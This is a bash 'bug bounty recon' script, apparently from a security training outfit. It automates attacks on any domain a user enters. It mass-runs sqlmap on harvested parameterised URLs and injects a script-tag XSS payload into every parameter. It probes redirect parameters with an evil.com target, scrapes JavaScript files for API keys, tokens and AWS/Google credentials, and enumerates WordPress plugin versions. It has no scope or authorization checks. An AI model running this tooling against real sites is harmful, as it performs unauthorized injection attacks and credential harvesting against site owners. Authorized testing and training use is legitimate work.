#!/bin/bash
# AJAK CyberAcademy Bug Bounty Recon Tool
# Author: Akash P

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

banner() {
    echo -e "${CYAN}"
    echo "========================================"
    echo " AJAK CyberAcademy Bug Bounty Recon Tool"
    echo "========================================"
    echo -e "${NC}"
}

menu() {
    echo "1) SQL Injection test (sqlmap + waybackurls)"
    echo "2) Extract all URLs from page source"
    echo "3) XSS test (waybackurls + qsreplace)"
    echo "4) Open Redirect check (gau)"
    echo "5) Extract sensitive info from .js files (gau)"
    echo "6) Filter live URLs with status code"
    echo "7) Banner grabbing"
    echo "8) Detect WordPress sites (subfinder)"
    echo "9) Enumerate WordPress plugins + versions (JSON)"
    echo "0) Exit"
    echo
}

sql_injection() {
    read -p "Enter target domain: " target
    waybackurls "$target" | grep -E '\bhttps?://\S+?=\S+' | grep -E '\.php|\.asp' | sort -u | \
    sed 's/\(=[^&]*\)/=/g' | tee urls.txt | sort -u -o urls.txt
    cat urls.txt | xargs -I{} sqlmap --technique=T --batch -u "{}"
}

extract_urls() {
    read -p "Enter target URL: " target
    curl -s "$target" | grep -oP '(https*://|www\.)[^ ]*' | sort -u
}

xss_test() {
    read -p "Enter target domain: " target
    waybackurls "$target" | grep '=' | qsreplace '"><script>alert(1)</script>' | \
    while read host; do
        curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && \
        echo -e "$host ${RED}Vulnerable-XSS${NC}"
    done
}

open_redirect() {
    read -p "Enter target domain: " target
    gau "$target" | grep -Ei '(\?|&)(url|redirect|next|to|r|dest|destination|redir)=' | \
    xargs -P10 -I{} bash -c 'final=$(curl -s -L -o /dev/null -w "%{url_effective}" "{}https://evil.com"); [[ "$final" == *"evil.com"* ]] && echo "[+] Open Redirect: {} -> $final"'
}

js_sensitive_info() {
    read -p "Enter target domain: " target
    gau "$target" | grep -iE "\.js(\?|$)" | sort -u | \
    xargs -P10 -I{} sh -c '
    matches=$(curl -s "{}" | grep -Eio "(apikey|api_key|secret|token|password|auth|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z\-_]{35})" | sort -u | tr "\n" "," | sed "s/,$//");
    if [ -n "$matches" ]; then
      echo "{\"url\": \"{}\", \"matches\": [\"$(echo $matches | sed "s/,/\", \"/g")\"]}";
    fi
    ' | jq -s .
}

filter_live() {
    read -p "Enter file with URLs: " file
    while read url; do
        curl -s -o /dev/null -w "%{http_code} $url\n" "$url"
    done < "$file"
}

banner_grab() {
    read -p "Enter URL: " url
    curl -s "$url" | grep 'Version'
}

wp_detect() {
    read -p "Enter target domain: " target
    subfinder -d "$target" -silent | \
    xargs -P10 -I{} bash -c 'curl -s -L "http://{}" | grep -qi "wp-content" && echo "[+] WordPress: http://{}"'
}

wp_plugins() {
    read -p "Enter target domain: " target
    subfinder -d "$target" -silent | \
    xargs -P10 -I{} bash -c '
    html=$(curl -s -L "http://{}")
    plugins=$(echo "$html" | grep -oP "wp-content/plugins/[^/]+")
    if [ -n "$plugins" ]; then
        while read -r plugin; do
            version=$(echo "$html" | grep -oP "$plugin[^\" ]*" | grep -oP "ver=[0-9\.]+" | head -n1 | sed "s/ver=//")
            echo "{\"domain\": \"{}\", \"plugin\": \"$plugin\", \"version\": \"${version:-unknown}\"}"
        done <<< "$plugins"
    fi
    ' | jq -s .
}

# Main script loop
banner
while true; do
    menu
    read -p "Select an option: " choice
    case $choice in
        1) sql_injection ;;
        2) extract_urls ;;
        3) xss_test ;;
        4) open_redirect ;;
        5) js_sensitive_info ;;
        6) filter_live ;;
        7) banner_grab ;;
        8) wp_detect ;;
        9) wp_plugins ;;
        0) exit ;;
        *) echo "Invalid choice" ;;
    esac
    echo
done
